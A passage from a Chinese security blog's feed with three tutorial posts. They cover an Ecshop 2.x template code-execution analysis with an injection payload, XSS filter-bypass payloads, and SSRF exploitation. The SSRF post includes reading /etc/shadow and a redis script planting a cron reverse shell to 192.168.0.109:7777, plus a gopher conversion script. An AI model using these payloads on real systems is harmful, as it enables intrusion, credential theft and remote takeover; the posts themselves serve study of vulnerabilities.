\''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</div><div class="line">        &#125;</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>传入的内容为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></div></pre></td></tr></table></figure><p><strong>这里绕过了第一个正则对危险字符的检测，直接到了函数代码最后一行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</div></pre></td></tr></table></figure><p><strong>这里将传入的内容进行匹配，<code>\\1</code>为匹配到的第一个元组，之后将匹配到的第一个元组值传入select函数，<code>\\1</code>的值如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$abc<span class="string">'];echo phpinfo/**/();//</span></div></pre></td></tr></table></figure><p><strong>之后定位到<code>select</code>函数，关键代码部分如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 处理&#123;&#125;标签</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string      $tag</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">...省略部分</div><div class="line">    <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// 变量</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">...省略部分</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>因为传入的内容第一个字符为<code>$</code>，所以满足该条件分支，之后将传入的内容经过substr截取处理后传入了<code>get_val</code>函数，这时传入的参数值变为了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">abc<span class="string">'];echo phpinfo/**/();//</span></div></pre></td></tr></table></figure><p><strong>定位到<code>get_val</code>函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">* 处理smarty标签中的变量标签</div><div class="line">*</div><div class="line">* @access  <span class="keyword">public</span></div><div class="line">* @param   string     $val</div><div class="line">*</div><div class="line">* @<span class="keyword">return</span>  bool</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></div><div class="line"><span class="function">    </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $moddb = explode(<span class="string">'|'</span>, $val);</div><div class="line">        $val = array_shift($moddb);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $all = explode(<span class="string">'.$'</span>, $val);</div><div class="line"></div><div class="line">      <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</div><div class="line">        &#123;</div><div class="line">            $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</div><div class="line">        &#125;</div><div class="line">        $p = implode(<span class="string">''</span>, $all);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        $p = <span class="keyword">$this</span>-&gt;make_var($val);</div><div class="line">    &#125;</div><div class="line">    ...省略部分</div><div class="line">    <span class="keyword">return</span> $p;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>由于传入的内容当中没有<code>[</code>、<code>|</code>和<code>.$</code>，所以不符合前三个条件，直接进入<code>make_var</code>函数，定位到<code>make_var</code>函数,相关的重要代码部分如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</div><div class="line">        &#123;</div><div class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</div><div class="line">        &#125;</div><div class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</div><div class="line">    &#125;</div><div class="line">    ...省略部分</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>由于传入的内容里面没有<code>.</code>所以满足第一个条件分支，传入的最终payload<code>$val</code>值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">abc<span class="string">'];echo phpinfo/**/();//</span></div></pre></td></tr></table></figure><p><strong>在拼接的时候闭合了前面<code>&#39;]</code>，之后$p变量的值变为了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']</span></div></pre></td></tr></table></figure><p><strong>之后<code>$p</code>依次经过<code>make_var</code>和<code>get_val</code>两个函数后返回到了<code>select</code>函数内，然后<code>select</code>函数拼接处理后返回值变为</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure><p><strong>之后回到<code>fetch_str</code>函数内，此时<code>preg_replace</code>的第二个参数<code>$this-&gt;select(&#39;\\1&#39;);</code>结果就变为了</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p><p><strong>之后<code>preg_replace</code>函数执行的结果就变为了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span>&#125;</span></div></pre></td></tr></table></figure><p><strong>之后上述值作为<code>fetch_str</code>函数的返回值会进入<code>_eval</code>函数内产生代码执行，执行phpinfo，<code>_eval</code>函数如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_eval</span><span class="params">($content)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    ob_start();</div><div class="line">    <span class="keyword">eval</span>(<span class="string">'?'</span> . <span class="string">'&gt;'</span> . trim($content));</div><div class="line">    $content = ob_get_contents();</div><div class="line">    ob_end_clean();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $content;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>最终php的<code>eval</code>函数执行的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> ...省略部分<span class="meta">?&gt;</span>&#123;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'abc'</span>];<span class="keyword">echo</span> phpinfo<span class="comment">/**/</span>();<span class="comment">//']; <span class="meta">?&gt;</span>&#125;</span></div></pre></td></tr></table></figure><p><strong>以上就是代码执行漏洞的执行过程，可以看到整个过程还是比较有意思的</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Ecshop2-x注入漏洞-amp-代码执行漏洞分析&quot;&gt;&lt;a href=&quot;#Ecshop2-x注入漏洞-amp-代码执行漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;Ecshop2.x注入漏洞&amp;amp;代码执行漏洞分析&quot;&gt;&lt;/a&gt;Ecshop2.x注入漏洞&amp;amp;代码执行漏洞分析&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://lawlietweb.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://lawlietweb.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>记一次有意思的XSS绕过之奇葩的中文尖括号</title>
    <link href="http://lawlietweb.com/2018/09/02/2018-09-02/"/>
    <id>http://lawlietweb.com/2018/09/02/2018-09-02/</id>
    <published>2018-09-02T15:02:20.000Z</published>
    <updated>2018-12-19T11:32:47.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次有意思的XSS绕过之奇葩的中文尖括号"><a href="#记一次有意思的XSS绕过之奇葩的中文尖括号" class="headerlink" title="记一次有意思的XSS绕过之奇葩的中文尖括号"></a>记一次有意思的XSS绕过之奇葩的中文尖括号</h1><p><strong>记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把<code>&gt;</code>变为了中文的尖括号<code>＞</code>，导致插入页面的<code>xss payload</code>不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~</strong><br><a id="more"></a></p><h3 id="奇葩的过滤"><a href="#奇葩的过滤" class="headerlink" title="奇葩的过滤"></a>奇葩的过滤</h3><p><strong>过滤方式如下</strong><br><img src="http://pic.c1imber.top/blog/180902/1Bh572Bkmh.png?imageslim" alt="mark"><br><strong>可以看到对输入的过滤是将<code>&gt;</code>变为了中文的尖括号<code>＞</code>，这样的话浏览器在解析html标签时，由于标签无法正常闭合就会出现语法错误而导致<code>xss payload</code>无法被浏览器解析执行，加上页面可以利用的输出点只有这一个位置并且在DOM的文本节点，所以在构造<code>xss payload</code>的时候<code>&gt;</code>符号是必不可少的</strong></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p><strong>绕过其实也很简单，构造<code>payload</code>如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img onerror=alert(1) src=&gt;</div></pre></td></tr></table></figure><p><strong>输出点变成了下面的样子</strong><br><img src="http://pic.c1imber.top/blog/180902/gj0JFAL2gd.png?imageslim" alt="mark"><br><strong>这一点的构造思路正是用到了中文尖括号<code>＞</code>在浏览器解析时不能被浏览器识别的特点，这样的话<code>＞”&lt;/span</code>会被浏览器当成<code>img</code>标签的<code>src</code>属性的属性值，也就是一个错误的图片资源，导致后面<code>span</code>标签的<code>&gt;</code>逃逸，于是<code>span</code>标签的<code>&gt;</code>闭合了<code>img</code>标签，<code>xss payload执行</code></strong><br><img src="http://pic.c1imber.top/blog/180902/423EEemCIF.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180902/kHFi96gB60.png?imageslim" alt="mark"></p><h3 id="补充其它的绕过方法"><a href="#补充其它的绕过方法" class="headerlink" title="补充其它的绕过方法"></a>补充其它的绕过方法</h3><p><strong>经过交流群里师傅们的指点，发现对于这种只过滤了<code>&gt;</code>的<code>XSS</code>是很不安全的,因为浏览器的容错性，在html标签内，很多标签并不需要<code>&gt;</code>的闭合就可以解析html，所以绕过方法很多，例如：</strong></p><p><strong>payload:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)<span class="comment">//</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180905/ela24g19CB.png?imageslim" alt="mark"><br><strong>使用firebug查看经过DOM渲染后的html代码，可以看到浏览器会自动的按照正确的html格式去补全标签</strong></p><p><strong>payload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg onload=alert(<span class="number">1</span>)<span class="comment">//</span></div></pre></td></tr></table></figure><p><strong>可以看到由于浏览器的容错性，标签也会被浏览器补全完整</strong><br><img src="http://pic.c1imber.top/blog/180905/kD1a3EEHel.png?imageslim" alt="mark"><br><strong>所以XSS的防御一定要完整的过滤转义<code>&lt;&gt;</code>这一对标签，仅仅只是过滤转义了<code>&gt;</code>还是很危险的</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次有意思的XSS绕过之奇葩的中文尖括号&quot;&gt;&lt;a href=&quot;#记一次有意思的XSS绕过之奇葩的中文尖括号&quot; class=&quot;headerlink&quot; title=&quot;记一次有意思的XSS绕过之奇葩的中文尖括号&quot;&gt;&lt;/a&gt;记一次有意思的XSS绕过之奇葩的中文尖括号&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把&lt;code&gt;&amp;gt;&lt;/code&gt;变为了中文的尖括号&lt;code&gt;＞&lt;/code&gt;，导致插入页面的&lt;code&gt;xss payload&lt;/code&gt;不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="http://lawlietweb.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="http://lawlietweb.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>ssrf漏洞原理以及利用方法</title>
    <link href="http://lawlietweb.com/2018/08/26/ssrf/"/>
    <id>http://lawlietweb.com/2018/08/26/ssrf/</id>
    <published>2018-08-26T01:33:24.000Z</published>
    <updated>2018-12-19T11:32:10.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf漏洞原理以及利用方法"><a href="#ssrf漏洞原理以及利用方法" class="headerlink" title="ssrf漏洞原理以及利用方法"></a>ssrf漏洞原理以及利用方法</h1><p><strong>ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip</strong><br><a id="more"></a></p><h3 id="ssrf中一些可以利用的curl协议"><a href="#ssrf中一些可以利用的curl协议" class="headerlink" title="ssrf中一些可以利用的curl协议"></a>ssrf中一些可以利用的curl协议</h3><p><strong>ssrf的利用方式取决于服务器所支持的curl协议，之前自己为了做该实验升级了curl的版本为最新版本，目前Centos6的curl版本为<code>7.61.0</code>,查看一下其支持的协议</strong><br><img src="http://pic.c1imber.top/blog/180826/IBHCm64DGe.png?imageslim" alt="mark"><br><strong>首先使用curl本地测试一些ssrf的攻击方法</strong></p><p><strong>利用file协议读取服务器的文件：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">"file:///etc/shadow"</span></div></pre></td></tr></table></figure></p><p><strong>权限比较大的话，直接读取系统影子文件,不过这种情况也只是在本地测试中以root用户运行curl时才会存在</strong><br><img src="http://pic.c1imber.top/blog/180826/7C2jmCKak0.png?imageslim" alt="mark"><br><strong>利用dict协议去进行服务版本探测：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">"dict://127.0.0.1:22/info</span></div></pre></td></tr></table></figure></p><p><strong>进行ssh服务的版本探测</strong></p><p><img src="http://pic.c1imber.top/blog/180826/felI287dFD.png?imageslim" alt="mark"><br><strong>利用gopher协议扩大攻击面，攻击本地或者内网的一些脆弱的地方</strong></p><p><strong>举个栗子：比如redis数据库的默认配置允许可以直接在本地无需密码直接访问数据库，通过redis未授权访问漏洞可以通过在本地访问数据库，执行数据库语句，以利于redis未授权访问漏洞结合linux cron反弹shell为例</strong></p><p><strong>首先先写一个可以自动利用的shell脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi rediscron.sh</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1\n\n"</span> | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> aaa</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x rediscron.sh</div></pre></td></tr></table></figure><p><strong>之后执行脚本: </strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rediscron.sh 127.0.0.1 6379</div></pre></td></tr></table></figure></p><p><strong>此时redis数据库的配置为没有修改的默认配置，我们可以通过本地访问redis去利用未授权访问漏洞反弹shell，可以看到执行脚本后成功在/var/spool/cron下创建了一个反弹shell的任务计划文件</strong><br><img src="http://pic.c1imber.top/blog/180826/fGLgBA73b9.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/180826/kGb2F8f109.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/180826/AcBK1kBhmD.png?imageslim" alt="mark"></p><p><strong>现在有一个问题就是如何将其转化为gopher协议的格式去利用，这里要利用到socat这个工具,去<a href="http://www.dest-unreach.org/socat/" title="socat官网" target="_blank" rel="external">socat官网</a>下载</strong><br><img src="http://pic.c1imber.top/blog/180826/gLCLjHD4AJ.png?imageslim" alt="mark"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz</div><div class="line">tar -zxvf socat-1.7.3.2.tar.gz</div><div class="line"><span class="built_in">cd</span> socat-1.7.3.2</div><div class="line">./configure</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure><p><strong>之后使用socat作为中间人代理抓取流量</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</div></pre></td></tr></table></figure><p><strong>这条命令的意思相当于是发往6379端口的数据会先经过本地的4444端口，相当于做了一个代理去抓包，可以理解为burpsuite抓包的原理</strong></p><p><strong>之后再次执行</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rediscron.sh 127.0.0.1 4444</div></pre></td></tr></table></figure></p><p><strong>可以看到socat抓到了redis攻击的数据流量,具体内容如下:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">&gt; 2018/08/25 01:51:28.003621  length=87 from=0 to=86</div><div class="line">*3\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line">aaa\r</div><div class="line"><span class="variable">$58</span>\r</div><div class="line"></div><div class="line"></div><div class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1</div><div class="line"></div><div class="line"></div><div class="line">\r</div><div class="line">&lt; 2018/08/25 01:51:28.003804  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.007530  length=56 from=0 to=55</div><div class="line">*4\r</div><div class="line"><span class="variable">$6</span>\r</div><div class="line">config\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line">dir\r</div><div class="line"><span class="variable">$15</span>\r</div><div class="line">/var/spool/cron\r</div><div class="line">&lt; 2018/08/25 01:51:28.007715  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.012076  length=52 from=0 to=51</div><div class="line">*4\r</div><div class="line"><span class="variable">$6</span>\r</div><div class="line">config\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$10</span>\r</div><div class="line">dbfilename\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">root\r</div><div class="line">&lt; 2018/08/25 01:51:28.012204  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.021196  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">save\r</div><div class="line">&lt; 2018/08/25 01:51:28.023025  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.026348  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">quit\r</div><div class="line">&lt; 2018/08/25 01:51:28.026530  length=5 from=0 to=4</div><div class="line">+OK\r</div></pre></td></tr></table></figure><p><strong>现在需要的就是将抓取到的redis攻击流量转化为gopher协议支持的格式，这里有一个转化规则</strong></p><ul><li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li></ul><p><strong>这里直接使用三叶草joychou师傅写的转化脚本tran2gopher.py</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding: utf-8</span></div><div class="line"><span class="comment">#author: JoyChou</span></div><div class="line">import sys</div><div class="line"></div><div class="line">exp = <span class="string">''</span></div><div class="line"></div><div class="line">with open(sys.argv[1]) as f:</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</div><div class="line">        <span class="keyword">if</span> line[0] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</div><div class="line">            <span class="built_in">continue</span></div><div class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></div><div class="line">        <span class="keyword">elif</span> line[-3:-1] == r<span class="string">'\r'</span>:</div><div class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></div><div class="line">            <span class="keyword">if</span> len(line) == 3:</div><div class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                line = line.replace(r<span class="string">'\r'</span>, <span class="string">'%0d%0a'</span>)</div><div class="line">                <span class="comment"># 去掉最后的换行符</span></div><div class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">                exp = exp + line</div><div class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></div><div class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</div><div class="line">            exp = exp + <span class="string">'%0a'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">            exp = exp + line</div><div class="line"><span class="built_in">print</span> exp</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div 